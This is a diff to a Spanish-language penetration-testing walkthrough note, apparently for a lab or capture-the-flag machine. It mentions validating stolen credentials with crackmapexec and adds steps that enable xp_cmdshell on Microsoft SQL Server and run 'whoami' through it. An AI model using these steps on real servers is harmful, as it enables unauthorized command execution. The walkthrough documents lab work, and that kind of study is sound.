@@ -221,6 +221,14 @@ enumerando la base de datos podemos obtener información sobre un usuario.
 con crackmapexec podemos validar las credenciales que hemos conseguido. las cuales son validas para enumerar el servicio SMB y HTTP
 ![[Pasted image 20240401235307.png]]
 
-### 
+### Configuración Database
+```python
+1. `SP_CONFIGURE "show advanced options", 1 # Este comando habilita la visualización de opciones avanzadas de configuración en el SQL Server. Al establecer el valor en `1`, se activan las opciones avanzadas de configuración. Esto es necesario para cambiar configuraciones específicas del servidor.
 
+2. `RECONFIGURE`
+
+3. `SP_CONFIGURE "xp_cmdshell", 1`
+
+4. `xp_cmdshell "whoami"`
+```
 ![[Pasted image 20240402000525.png]]
